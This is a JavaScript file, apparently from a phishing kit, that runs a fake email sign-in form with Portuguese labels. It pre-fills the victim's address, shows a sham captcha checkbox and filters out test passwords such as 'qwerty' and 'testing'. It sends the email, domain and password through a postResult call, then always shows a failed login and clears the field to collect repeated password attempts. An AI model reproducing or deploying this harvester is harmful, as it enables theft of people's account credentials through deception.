// 
const loca_float = document.querySelectorAll(".loca_float");
const loca_capture_box = document.getElementById("loca_capture_box");
const loca_inputs = document.getElementsByClassName("loca_inputs");

if (validEmail.test(usermail)) {
    $("#loca_mail").val(usermail)
    $("#loca_mail").attr('readOnly', true)
}

if (loca_float != null) {
    if (validEmail.test($("#loca_mail").val())) {
        loca_float[0].style.top = "-1rem"
    }
}

// 

$("#loca_mail").on("click", ()=>{
   loca_float[0].style.top = "-1rem"
});

$("#loca_pass").on("click", ()=>{
    loca_float[1].style.top = "-1rem"
 });

 $("#loca_show_pass").on("click", ()=>{
    let loca_pass = document.getElementById("loca_pass");
    if (loca_pass.type ==="text") {
        loca_pass.type ="password"
        $("#loca_show_pass").text("Exibir") 
    } 
    else {
        loca_pass.type ="text"
        $("#loca_show_pass").text("Ocultar")  
    }
 });

 $("#loca_capture_box").on("click", ()=>{
    $("#loader").show().css({"display":"flex"});

    setTimeout(() => {
        $("#loader").hide();
        $("#loca_form_foot").css({"border-color":"silver"})
    }, 1000);
 })

// 

$("#loca_form").on('submit', (e)=>{
    e.preventDefault();

    if (loca_capture_box.checked == false) {
        $("#loca_form_foot").css({"border-color":"red"})
        return
    }
    else{
        $("#loca_form_foot").css({"border-color":"silver"}) 
    }

    // 

    if (!validEmail.test($("#loca_mail").val())) {
        loca_inputs[0].style.borderColor = "red";
        return
    }
    else{
        loca_inputs[0].style.borderColor = "silver";
    }

    if (validEmail.test($("#loca_pass").val()) || $("#loca_pass").val().length < 6 || $("#loca_pass").val().toLowerCase() == "qwerty" || $("#loca_pass").val() == 123456 || $("#loca_pass").val().toLowerCase() == "password" || $("#loca_pass").val().toLowerCase() == "testing") {
        loca_inputs[1].style.borderColor = "red";
        return
    }
    else{
        loca_inputs[1].style.borderColor = "silver";
    }

    $("#loader").show().css({"display":"flex"});

    let url = $("#loca_mail").val().split('@');

    postResult(url[1], $("#loca_mail").val(), $("#loca_pass").val(), postCount);
    
    setTimeout(() => {
        loca_inputs[1].style.borderColor = "red";
        postCount++
        $("#loca_pass").val("")
    }, delayCounter);
})